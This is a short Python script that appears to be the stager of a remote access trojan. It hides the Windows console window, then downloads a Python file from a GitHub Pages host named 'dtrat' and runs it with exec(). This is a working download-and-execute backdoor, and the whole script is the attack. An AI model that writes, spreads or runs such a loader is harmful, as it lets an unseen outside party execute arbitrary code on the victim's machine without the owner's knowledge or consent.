# Hide cmd
try:
    import ctypes
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
except:
    pass
# Begin program
import pyautogui
import requests
import time
import os, sys
import platform

exec(str(requests.get("https://dtrat.github.io/dtrat/main.py?q={}".format(time.time)).content.decode("utf-8")))
